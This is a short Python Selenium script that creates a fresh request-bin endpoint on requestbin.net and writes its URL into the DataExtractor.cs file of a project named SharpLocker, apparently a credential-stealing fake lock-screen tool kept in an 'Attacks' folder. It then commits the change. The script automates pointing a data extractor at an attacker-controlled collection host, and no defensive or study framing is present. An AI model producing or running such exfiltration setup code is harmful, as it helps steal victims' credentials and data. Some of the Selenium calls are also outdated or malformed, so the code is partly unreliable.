import selenium
from selenium import webdriver
# Using Chrome to access web
driver = webdriver.Chrome('C:\\Users\\carso\\Downloads\\chromedriver_win32\\chromedriver.exe')

# Open the website
driver.get('https://requestbin.net')

button = driver.find_element_by_xpath("""//*[@id="content"]/div/div/div/form/p[1]/a""")
driver.maximize_window()
button.click()
driver.implicitly_wait(10)
url = driver.find_element_by_css_selector('input[class="xxlarge input-xxlarge"')

print(url.get_attribute('value'))

a_file = open("D:\Carson\Programming\Attacks\SharpLocker-master\SharpLocker\DataExtractor.cs", "r")
list_of_lines = a_file.readlines()
list_of_lines[31] = f"""            url = "{url.get_attribute('value')}";\n"""

a_file = open("D:\Carson\Programming\Attacks\SharpLocker-master\SharpLocker\DataExtractor.cs", "w")
a_file.writelines(list_of_lines)
a_file.close()

import os

os.system("""cd D:\Carson\Programming\Attacks\SharpLocker-master\\""")
os.system('git add D:\Carson\Programming\Attacks\SharpLocker-master\SharpLocker\DataExtractor.cs')
os.system('git commit -m "updated url"')
